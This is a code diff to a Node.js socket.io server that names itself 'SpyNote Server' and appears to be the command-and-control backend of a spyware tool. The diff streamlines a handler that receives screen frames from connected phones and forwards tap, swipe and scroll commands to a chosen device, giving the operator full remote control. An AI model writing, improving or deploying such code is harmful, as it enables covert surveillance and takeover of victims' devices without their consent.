@@ -55,8 +55,6 @@ io.on('connection', (socket) => {
 
     socket.on('screen-frame', (data) => {
         const deviceId = data.deviceId;
-        console.log('📺 Frame from:', deviceId);
-        
         if (devices.has(deviceId)) {
             socket.broadcast.emit('screen-update', {
                 deviceId,
@@ -68,57 +66,41 @@ io.on('connection', (socket) => {
         }
     });
 
-    // 🔥 FIXED CONTROL HANDLER - SAB PERFECT
+    // 🔥 PERFECT CONTROL HANDLER
     socket.on('control', (data) => {
-        console.log('🎮 RAW DATA RECEIVED:', JSON.stringify(data, null, 2));
+        console.log('🎮 CONTROL RECEIVED:', JSON.stringify(data, null, 2));
         
-        const { deviceId, action, x, y, startX, startY, endX, endY } = data;
+        const { deviceId, action } = data;
         
-        if (!deviceId) {
-            console.log('❌ No deviceId');
-            return;
-        }
-
-        if (!devices.has(deviceId)) {
-            console.log('❌ Device not found:', deviceId);
+        if (!deviceId || !devices.has(deviceId)) {
+            console.log('❌ Invalid device:', deviceId);
             return;
         }
 
         const targetSocketId = deviceSockets.get(deviceId);
         if (!targetSocketId) {
-            console.log('❌ Device socket not found:', deviceId);
+            console.log('❌ Socket not found for:', deviceId);
             return;
         }
 
-        // 🔥 BUILD CLEAN CONTROL OBJECT
+        // 🔥 FORWARD EXACT DATA TO DEVICE
         const controlData = {
-            action: action || 'unknown',
-            deviceId: deviceId
+            action: action,
+            x: data.x,
+            y: data.y,
+            startX: data.startX,
+            startY: data.startY,
+            endX: data.endX,
+            endY: data.endY
         };
 
-        // 🔥 EXTRACT COORDINATES PROPERLY
-        if (x !== undefined && y !== undefined) {
-            controlData.x = parseFloat(x) || 0;
-            controlData.y = parseFloat(y) || 0;
-        }
+        console.log('📱 FORWARDING TO DEVICE:', JSON.stringify(controlData, null, 2));
         
-        if (startX !== undefined && startY !== undefined) {
-            controlData.startX = parseFloat(startX) || 0;
-            controlData.startY = parseFloat(startY) || 0;
-        }
-        
-        if (endX !== undefined && endY !== undefined) {
-            controlData.endX = parseFloat(endX) || 0;
-            controlData.endY = parseFloat(endY) || 0;
-        }
-
-        console.log('🎮 CLEAN CONTROL SENT:', JSON.stringify(controlData, null, 2));
-        
-        // 🔥 SEND TO DEVICE SOCKET
+        // Send to specific socket AND room
         io.to(targetSocketId).emit('control', controlData);
-        io.to(deviceId).emit('control', controlData); // Backup
+        io.to(deviceId).emit('control', controlData);
         
-        console.log('✅ Control sent to:', deviceId, 'Socket:', targetSocketId);
+        console.log('✅ CONTROL SENT to', deviceId);
     });
 
     socket.on('disconnect', () => {
@@ -138,5 +120,5 @@ io.on('connection', (socket) => {
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`🚀 SpyNote Server: http://localhost:${PORT}`);
-    console.log(`📱 Multi-device + FULL CONTROL ready!`);
+    console.log(`📱 TAP/SWIPE/SCROLL/BUTTONS READY!`);
 });
